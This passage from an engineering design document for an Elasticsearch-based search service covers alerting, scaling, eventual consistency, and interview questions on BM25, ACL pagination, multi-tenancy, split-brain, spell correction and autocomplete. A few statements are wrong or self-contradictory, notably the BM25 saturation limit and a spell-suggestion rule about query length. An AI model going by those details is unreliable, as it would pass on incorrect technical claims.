**Alert (page/urgent):**
- p99 search latency > 1 second sustained for > 2 minutes
- Elasticsearch shard failures > 0 (partial result degradation)
- Zero result rate > 30% (10× normal — index corruption or query normalization regression)
- Auth failure rate > 10% of requests (credential stuffing or certificate issue)
- Redis cache hit rate < 10% (cache eviction storm or cache cluster failure)
- JWT algorithm confusion in logs (security incident)
- Kafka consumer lag > 100,000 (analytics pipeline backing up — data loss risk)

**Log but don't alert:**
- Individual rate limit triggers (normal user behavior — alert only on sustained spikes)
- Individual cache misses (expected on first request for any query)
- JWT expiry failures (expected — clients refresh tokens; transient auth failures are normal)
- Autocomplete requests with no suggestions (normal for rare prefixes)

---

## 13. Scaling Considerations

### Bottlenecks

**The inverted index is the fundamental bottleneck.** It does not scale writes horizontally as cleanly as reads. Read scaling is trivial (add replicas). Write scaling requires resharding, which is operationally complex in most search engines.

```
Write path throughput limits:
  Indexing rate (Elasticsearch): ~10,000 docs/second per node (varies by doc size)
  At 1 billion documents: 1000 seconds to re-index from scratch = ~17 minutes
  Shard size limit: 50GB per shard (beyond this, search performance degrades)
  Max shards per node: ~1000 (beyond this, coordination overhead dominates)

Read path throughput limits:
  Query rate per shard: ~200-500 simple queries/second
  Query rate scales with replica count (add replicas → add query throughput)
  Memory is the binding constraint: active segments should fit in OS page cache
```

**Redis bottleneck — single-key operations:**
The rate limit key `rate:search:user:{userId}` is incremented on every search request. At 10,000 requests/second across all users, Redis handles 10,000 INCR operations/second — trivial for Redis. But if you have a single hot user (e.g., a bot) hammering the API, a single key can receive 1000 INCR/second. Redis is single-threaded per key — this serializes, but Redis can handle millions of operations/second total, so a single-key hotspot rarely matters for rate limiting.

**The coordinator node is a single point of bottleneck:**
In Elasticsearch, the coordinating node for a query receives all shard responses, merges them, and returns the result. If you have 20 shards, the coordinator receives 20 responses and must hold them all in heap memory simultaneously. At high query rates, the coordinator's heap fills with in-flight result merges. Use dedicated coordinator nodes (nodes that hold no data, only coordinate). Scale the coordinator tier horizontally.

---

### Horizontal vs. Vertical Scaling

| Component | Strategy | When to Scale |
|---|---|---|
| Search API service | Horizontal (more pods) | CPU > 70% sustained, or p99 latency rising |
| Elasticsearch data nodes | Horizontal (more nodes, more shards) | Disk > 70%, query latency rising, indexing rate bottleneck |
| Elasticsearch coordinator | Horizontal (more dedicated coordinator nodes) | High merge CPU on existing coordinators |
| Redis | Horizontal (Redis Cluster, more shards) | Memory > 70%, ops/second approaching limit |
| PostgreSQL (ACL DB) | Vertical + Read replicas | Write heavy: vertical; Read heavy: add replicas |
| Kafka | Horizontal (more partitions/brokers) | Consumer lag growing, producer throughput limited |

**Sharding strategy for Elasticsearch:**
```
Initial sizing formula:
  Shard count = ceil(total_doc_count / docs_per_shard_target)
  docs_per_shard_target = 20,000,000 (20M docs per shard — rule of thumb)
  
  For 100M documents:
  shard_count = ceil(100M / 20M) = 5 shards
  
  Replica count = 1 (default — each primary has 1 replica)
  Total shards = 5 × (1 + 1) = 10 shards (5 primary + 5 replica)

Re-sharding: Elasticsearch supports split/shrink APIs but they require downtime
or a reindex. Plan for growth by over-sharding slightly initially.
```

---

### Consistency Tradeoffs

**Search is eventually consistent by design.** When a document is updated:
1. The document is updated in PostgreSQL (source of truth) — immediate consistency
2. A change event is published to Kafka
3. The indexer consumer reads the event and re-indexes the document in Elasticsearch
4. The new document version is in a new Lucene segment, not yet committed
5. Elasticsearch refreshes the index segment (default: every 1 second)
6. The updated document is now searchable

Total propagation delay: 1 second (best case, high traffic pipeline may add 5–30 seconds).

**Implication:** A user who updates a document and immediately searches for it may see the old version for up to 30 seconds. This is the *search lag* or *index propagation delay*. It must be documented and communicated as a known system behavior.

**Mitigation for critical use cases:** After a document update, send the user's next search directly to the primary (bypassing cache), with a flag: `?freshness=required`. The query hits Elasticsearch with `?preference=_primary` to query primary shards only (more up-to-date than replicas).

**Cache consistency:** If a user updates a document and the search result is cached, the cached result may be stale for up to 300 seconds (cache TTL). For per-user caches, the user's own write can trigger a targeted cache invalidation: `DEL cache:search:*:{userId}`. This is approximate — it removes all of this user's cached searches, not just the one affected by the update. But it's cheap and ensures the user sees their own changes quickly.

---

## 14. Interview Questions

### Q1: Explain how BM25 scoring works and why it's better than raw TF-IDF for a search system.

**Direct answer:**
BM25 (Best Match 25, from the Okapi BM25 probabilistic model) improves on TF-IDF in two key ways:

**Term frequency saturation (k1 parameter):**
TF-IDF score is linearly proportional to term frequency. A document with "search" appearing 100 times scores 100× higher than one with it appearing once. This is exploitable (keyword stuffing) and intuitive poor (after 5 occurrences, the 6th adds little informational value).

BM25 applies a saturation curve: `tf / (tf + k1 × ...)`. As tf grows, this approaches `1/k1` asymptotically. The default k1=1.2 means additional occurrences beyond ~4 add negligible score improvement.

**Document length normalization (b parameter):**
TF-IDF doesn't account for document length. A long document naturally has more term occurrences. BM25 normalizes by document length relative to the average document length in the collection. A short document with "search" once may score comparably to a long document with "search" five times, because in the short document, the term is a larger proportion of the content.

**Inverse Document Frequency (IDF) — shared with TF-IDF:**
Terms appearing in many documents are weighted lower. "the" (in every document) has near-zero IDF. "Elasticsearch" (in few documents) has high IDF. BM25's IDF formula avoids negative IDF values for very common terms.

**What if the k1 parameter is set too high?** The saturation kicks in later, making the system more sensitive to repeated terms — closer to raw TF. Setting k1=100 essentially removes saturation. Optimal k1 and b values depend on the document corpus and are typically tuned empirically.

---

### Q2: A search query that normally takes 80ms suddenly takes 4 seconds. Walk through your debugging process.

**Systematic approach:**

**First 5 minutes:**
- Is this one user or all users? Check p50, p95, p99 latency metrics — if p50 is fine but p99 is 4s, it's a specific query pattern. If all percentiles are degraded, it's systemic.
- When did it start? Correlate with recent deployments, Elasticsearch node changes, traffic spikes.
- Check distributed trace for a recent slow query: where is the time going? (JVM GC? Shard merge? ACL lookup? Redis timeout?)

**If it's Elasticsearch:**
- `GET /_nodes/stats/jvm` — check JVM heap usage and GC pause times. If `jvm.gc.collectors.old.collection_time_in_millis` is growing rapidly, GC pauses are the cause.
- `GET /_tasks?detailed&actions=*search` — list active search tasks. If any task has been running for seconds, it's a slow query consuming resources.
- Check shard allocation: `GET /_cluster/health` — are all shards assigned? An unassigned shard causes queries to a) fail or b) route to a single node (removing parallelism).
- Check if a shard is on a disk that's near capacity (full disks cause I/O stalls).

**If it's the application layer:**
- ACL lookup: is PostgreSQL slow? Check pg_stat_activity for long-running queries. Missing index on the ACL table? At scale, `SELECT groups FROM acl WHERE user_id = ?` without an index on `user_id` is a full table scan.
- Redis: is the cache returning timeout errors? Check Redis memory usage — if at `maxmemory` and eviction policy is `allkeys-lru`, every cache read may trigger an eviction (expensive). Increase Redis memory or reduce cache TTL.
- What if the slow query is a wildcard? Check if any new client version is sending `*` or regex queries that bypass the query type allowlist.

**What if:** What if the slowdown is correlated with a specific node joining the cluster? A newly added Elasticsearch node triggers shard rebalancing — shards move across nodes. During rebalancing, queries to moving shards are slower (reading from network rather than local disk). This is temporary (~30 minutes) and not a bug.

---

### Q3: Why is applying ACL post-search (after getting results) problematic for pagination, and how do you solve it?

**Direct answer:**

Post-search ACL filtering with offset pagination breaks result consistency in two ways:

**Problem 1: Incorrect total count.**
The search engine returns `total = 847`. This count includes all documents matching the query, including ones the user can't see. After ACL filtering, the user can actually see 300 of them. The UI showing "847 results" is misleading.

**Problem 2: Sparse pages.**
If you fetch 20 results and ACL-filter 15 of them, you return 5 results on "page 1." The user clicks "page 2." You fetch results 21–40 and ACL-filter 12 of them, returning 8 results. Pages have inconsistent and unpredictable sizes. "Next page" may return 0 results even when more accessible results exist.

**Problem 3: Over-fetching pressure.**
To guarantee a full page of 20 ACL-visible results, you must over-fetch. How much? If 75% of results are filtered out, you need to fetch 80 to return 20. But you don't know the filter rate in advance. You must fetch increasingly larger batches for later pages — deep pagination becomes impossibly expensive.

**Solutions:**

**Option A: Pre-filter ACL in the index.** Add `allowed_groups` field to each indexed document. Include the user's groups in the search filter. The index only returns documents the user can see. Total count is accurate. No over-fetching. Tradeoff: ACL data must be re-indexed when permissions change.

**Option B: Cursor-based pagination with over-fetch + fill.** Instead of page N, use a cursor (the last seen document ID). Fetch 100 results beyond the cursor, ACL-filter them, return the first 20 visible ones. Record the last cursor position. Next page request continues from that cursor. This works with over-fetching but avoids the page-size inconsistency problem. The cost is higher load per page request (fetching 100 to return 20).

**Option C: Two-tier index.** Maintain a permissions index separately from the content index. For each query, first get the list of document IDs the user can access (from the permissions index), then query the content index with that ID list as a filter. Works for fine-grained ACL but scales poorly when the user can access millions of documents (the ID list filter becomes huge).

---

### Q4: Explain the challenges of implementing search in a multi-tenant system. What can go wrong?

**Direct answer:**

**Challenge 1: Data isolation.** By default, a single Elasticsearch index stores all tenants' data. A misconfigured query (missing tenant filter) returns results from all tenants. Defense: enforce tenant filter at the query builder level (never in individual handlers), and add an integration test that verifies cross-tenant isolation.

**Challenge 2: Noisy neighbor.** One tenant's high-traffic search pattern (scheduled batch queries, load testing) consumes disproportionate shard resources. Other tenants' queries are slower because they compete for the same shard thread pools. Solution: per-tenant indices with dedicated shard allocation on separate nodes, or at minimum, per-tenant query throttling.

**Challenge 3: Index size imbalance.** Tenant A has 100 documents, Tenant B has 50 million. If co-indexed, all shards are dominated by Tenant B's data. Tenant A's queries fan out to all shards even though Tenant B's data is irrelevant. Solution: per-tenant index routing, or shard allocation awareness (`index.routing.allocation.require.tenant_group = group_A`).

**Challenge 4: Facet count leakage.** Global facet aggregations (e.g., "count of articles by author across all results") include other tenants' documents if ACL filtering is applied post-aggregation. Solution: always apply tenant filter before aggregations.

**Challenge 5: Synonym dictionary pollution.** A shared synonym dictionary means Tenant A's domain-specific synonyms affect Tenant B's results. Solution: per-tenant index settings with per-tenant synonym filters.

**What if:** What if a tenant's contract ends and their data must be deleted? In a shared index, deleting by tenant requires a delete-by-query (slow, leaves tombstoned docs until segment merge). In a per-tenant index, deleting is an index drop (fast, instant). Per-tenant indices are strongly preferred for GDPR right-to-erasure compliance.

---

### Q5: How does the inverted index handle phrase queries vs. keyword queries? What's the performance difference?

**Direct answer:**

**Keyword query (default):**
`match: {"content": "distributed tracing"}` in Elasticsearch by default is a boolean OR on `["distributed", "tracing"]`. It returns documents containing either term, scored by BM25. Implementation: look up each term's postings list, union the lists, compute BM25 score for each document. Cost: O(D) where D is the number of documents containing any of the terms.

**Phrase query:**
`match_phrase: {"content": "distributed tracing"}` requires the terms to appear adjacent in the document, in order. Implementation:

1. Look up "distributed" postings list: `[doc1: pos=[0, 15], doc3: pos=[5]]`
2. Look up "tracing" postings list: `[doc1: pos=[1, 16], doc2: pos=[3]]`
3. For each document in the intersection, check if `pos("tracing") == pos("distributed") + 1`
4. doc1: "distributed" at pos 0, "tracing" at pos 1 → 1 == 0+1 → ✓ phrase match
5. Return only doc1

This requires **term positions** to be stored in the index. Elasticsearch stores positions by default (`index.options: positions`). Without positions, phrase queries fall back to approximations or fail.

**Performance difference:** Phrase queries are significantly more expensive than keyword queries because:
1. The intersection must check positional data, not just document membership
2. A document with both terms scattered throughout (not adjacent) must still be checked and rejected
3. Position data increases index size by ~60% vs. storing only document membership

**Proximity queries (slop):** `match_phrase: {query: "distributed tracing", slop: 2}` matches if the terms appear within 2 positions of each other (in any order). This uses an edit-distance algorithm on the position sequence and is more expensive than exact phrase matching.

---

### Q6: What is a "split-brain" scenario in an Elasticsearch cluster, and how does it lead to data corruption?

**Direct answer:**

Split-brain occurs when an Elasticsearch cluster loses network connectivity between nodes, and two nodes each believe they are the master. Both continue to accept writes independently. When connectivity is restored, the cluster has two conflicting versions of the index state — documents were written to both "masters" without coordination.

**How it happens:**
```
Cluster: 3 nodes (node1=master, node2, node3)
Network partition: node1 loses connection to node2 + node3
  → node2 and node3 hold an election, elect node2 as master
  → node1 still believes it is master (it hasn't heard from the others)

Now:
  Writes to node1: accepted (node1 is "master")
  Writes to node2: accepted (node2 is "master")
  Two diverging index states exist simultaneously
```

**Minimum master nodes setting (the fix):**
Elasticsearch's `discovery.zen.minimum_master_nodes` (old) or `cluster.initial_master_nodes` + voting configuration (new) requires a quorum to elect a master. With 3 nodes:
- Set minimum_master_nodes = 2 (quorum = ceil(3/2))
- After partition: node1 (alone) cannot form a quorum → stops accepting writes → remains available for reads only
- node2 + node3 form quorum → elect master → continue operating
- Net result: no split-brain. Writes only go to the majority partition.

**Trade-off:** With minimum_master_nodes = 2 out of 3, losing 2 nodes makes the cluster unavailable (no write quorum). The cluster prefers consistency over availability — this is the correct choice for a search index that must not diverge.

**Modern Elasticsearch (7.x+):** Automatically configures the voting mechanism correctly for clusters of 3+ nodes. But the principle remains: never run a 2-node cluster (no quorum possible that prevents split-brain).

---

### Q7: A user reports that searching for their own recently published document returns no results for 30 seconds, then it appears. Explain what's happening and how you'd improve this.

**Direct answer:**

**What's happening — the propagation pipeline:**
1. User publishes document → PostgreSQL write (immediate consistency)
2. Change data capture (CDC) or application event → Kafka message
3. Kafka consumer reads message (may be batched) → Elasticsearch bulk index request
4. Elasticsearch receives index request → writes to in-memory translog + Lucene in-memory buffer
5. Elasticsearch **refresh** happens (default every 1 second) → segment is committed to disk and becomes searchable
6. Total delay: Kafka consumer batch interval (5–10s) + Elasticsearch refresh (1s) + network latency (~1s) = 7–12 seconds typical, 30 seconds in worst case (high consumer lag)

**Why it's 30 seconds sometimes:**
- Kafka consumer group is behind (consumer lag) due to bulk indexing pressure
- Elasticsearch is under high indexing load and merge operations delay the refresh
- The refresh interval was increased from 1s to 30s to boost indexing throughput (a common performance optimization that breaks freshness expectations)

**How to improve:**

Option 1: **Force refresh on publish.** After writing to Kafka, the application also calls `POST /document_index/_refresh` directly. Expensive — forces immediate segment commit. Do this only for the specific index receiving the new document, not the whole cluster.

Option 2: **Reduce refresh interval for this index.** `PUT /documents/_settings {"index": {"refresh_interval": "1s"}}`. The default is fine; ensure it hasn't been tuned to 30s for indexing performance.

Option 3: **Write-through to search index directly.** On document publish, write to Elasticsearch synchronously (bypassing Kafka). Kafka is still used for eventual consistency. Adds latency to the publish operation (~20ms) but eliminates the propagation delay for the publishing user.

Option 4: **Client-side optimistic update.** After a user publishes, immediately show the document in their search results without waiting for the index. The document is stored locally (in the client JS state) and injected into search results for queries that would match it. Simple to implement, eliminates perceived delay, but requires knowing which queries the new document should match (client-side relevance scoring).

---

### Q8: How would you implement "did you mean" spell correction for a search system? What data structures are involved?

**Direct answer:**

**The fundamental problem:** User types `"distibuted tracng"` (two typos). How do you detect this is a typo and suggest `"distributed tracing"` without false positives on valid queries?

**Approach 1: Edit Distance + Frequency Dictionary**

Build a dictionary of correct terms from the indexed corpus (all unique terms in the inverted index, weighted by document frequency). For each query term:

1. Compute edit distance (Levenshtein or Damerau-Levenshtein, which also handles transpositions) between the query term and all dictionary terms.
2. Suggest the nearest dictionary term with edit distance ≤ 2.
3. Among candidates at the same edit distance, prefer more frequent terms (higher IDF weight = appears in more documents = more likely to be the intended term).

Cost: O(|query_term| × |dictionary|) per term. Dictionary has millions of terms → too slow for online computation.

**Approach 2: Symspell (Fast at Query Time)**

Pre-compute: for every dictionary word, generate all words within edit distance 2 (by deleting characters). Store in a hash map: `{modified_form → [original_words]}`.

At query time: given "distibuted" (a typo), generate all its single/double deletions and look them up in the pre-computed hash map. Matches indicate nearby correct words.

This shifts the expensive computation to index time. Online lookup is hash table O(1). SymSpell is ~1000× faster than standard edit distance for spell correction.

**Approach 3: N-gram Index**

Index each word as trigrams: "distributed" → ["dis", "ist", "str", "tri", "rib", "ibu", "but", "ute", "ted"]. At query time, look up the typo's trigrams and find dictionary words that share the most trigrams.

**Implementation in Elasticsearch:**

Elasticsearch's `suggest` API uses the Lucene DirectSpellChecker under the hood (edit distance-based). For production systems, a separate lightweight spell correction service (SymSpell or norvig-spell-correct) is often preferred — faster, configurable, and can be tuned to the product's specific vocabulary (technical terms don't appear in general dictionaries).

**Key decision: when to trigger spell suggestion:**

Only suggest if:
- The query returned 0 or very few results (< 5)
- The typo confidence score is above a threshold
- The query is not a known technical term (avoid correcting "kubectl" to "kubecontrol")

Don't suggest when:
- The query returned good results (user intent was understood)
- The "correction" has the same character frequency as the original (equal confidence)
- The query is longer than 3 characters total (very short queries are ambiguous)

---

### Q9: Why are wildcard queries expensive in search engines, and what are the safe ways to support them?

**Direct answer:**

**Why wildcard queries are expensive:**

A standard inverted index stores term → documents. To answer `q=distrib*`, you need to find all terms in the dictionary that start with "distrib" and union their postings lists.

In a standard sorted terms dictionary (Lucene FST — Finite State Transducer), prefix lookups are O(prefix_length) — fast. But arbitrary wildcard like `q=*tracing*` (middle wildcard) requires scanning every term in the dictionary to check if it matches the pattern. For an index with 10M unique terms, this is 10M string pattern checks — on the hot path of every query.

Regex queries are worse: the regex automaton is applied to every term in the dictionary. A pathological regex like `(a+)+z` can cause catastrophic backtracking — O(2^n) time.

**Safe ways to support wildcard-like behavior:**

1. **Prefix queries only (safe):** Allow `q=distrib*` (prefix) but not `q=*strib*` (leading wildcard). Prefix queries use the sorted terms dictionary efficiently — O(prefix_length) to find the start, then linear scan of terms with that prefix.

2. **N-gram tokenization at index time:** Index every token as its character n-grams. "distributed" becomes ["dis", "ist", "str", ...]. At query time, `*strib*` becomes searching for the trigram "str". This returns all documents with any word containing "str" — then filter for exact match. Expensive in index size (~5× larger) but fast at query time.

3. **Edge N-gram for autocomplete:** Index only the leading N-grams: "dis", "dist", "distr", "distri", "distrib"... This supports efficient prefix autocomplete without full wildcard.

4. **Disable arbitrary wildcards in the user-facing query:** Map `q=distrib*` to a prefix query internally, but never allow user input to directly specify Elasticsearch wildcard query syntax. A user should never be able to type Elasticsearch DSL — they type natural language and the query builder translates it.

**Elasticsearch configuration to enforce this:**
```json
PUT /_cluster/settings
{
  "transient": {
    "search.allow_expensive_queries": false
  }
}
```
This disables: wildcard queries on analyzed fields, regex queries, leading-wildcard queries, fuzzy queries, join queries, and large range queries. The Search API must not rely on these for correctness — only as optional enhancements.

---

### Q10: Describe exactly how you would implement a real-time autocomplete that returns suggestions within 20ms.

**Direct answer:**

**Requirements:**
- 20ms p99 latency
- Suggests as user types (prefix matching)
- Shows relevant, popular suggestions
- Does not expose confidential document titles to unauthorized users

**Architecture:**

```
Redis Hash (in-memory trie approximation):
  Key: "suggest:{prefix}"
  Value: JSON array of top-10 suggestions with metadata

  "suggest:dis"    → [{"text": "distributed tracing", "count": 15420}, ...]
  "suggest:dist"   → [{"text": "distributed tracing", "count": 15420}, ...]
  "suggest:distr"  → [{"text": "distributed tracing", "count": 15420}, ...]
  ...
```

**Pre-computation:**

An offline job runs every 30 minutes:
1. Read the top 10,000 queries from the last 7 days (from ClickHouse analytics)
2. For each query, generate all its prefixes from length 2 to full length
3. For each prefix, update a Redis sorted set: `ZADD suggest:{prefix} {query_count} {query_text}`
4. Trim each sorted set to top 20 members: `ZREMRANGEBYRANK suggest:{prefix} 0 -21`

**Query time:**
```python
def autocomplete(prefix: str) -> List[str]:
    if len(prefix) < 2:
        return []  # don't suggest for single character
    
    prefix = prefix.lower().strip()[:50]  # normalize, limit length
    
    # Redis sorted set lookup: O(log N) where N is set size (max 20)
    suggestions = redis.zrevrange(f"suggest:{prefix}", 0, 9, withscores=False)
    
    return suggestions  # already sorted by popularity
```

Redis sorted set lookup is O(log N) — with max 20 members, this is effectively O(1). Total response time: network to Redis (0.5ms) + Redis operation (0.1ms) + network back (0.5ms) + JSON serialize (0.1ms) = ~2ms server-side latency. With CDN caching (suggestions are the same for all users), response from CDN edge: <5ms.

**ACL for suggestions:**
Public suggestions (safe to show to anyone): derived only from queries on public documents.
Tenant-specific suggestions: separate suggest::{tenantId}:{prefix} keys per tenant.
User-specific suggestions: add user's own recent queries to the suggestion list client-side (stored in localStorage or session) — no server round-trip, no ACL concerns.

**Handling long-tail queries:**
If the prefix has no pre-computed suggestions (rare prefix), fall back to an Elasticsearch `search_as_you_type` field query. This is slower (~30ms) but handles arbitrary prefixes. The client shows a loading indicator briefly for these cases. Track which prefixes trigger fallback — if a prefix becomes frequent, add it to the pre-computation job.

---

*End of document. This breakdown should be revisited when the search engine version, tokenization pipeline, ACL model, or infrastructure changes. Security properties are architectural — they are invalidated by architectural drift.*
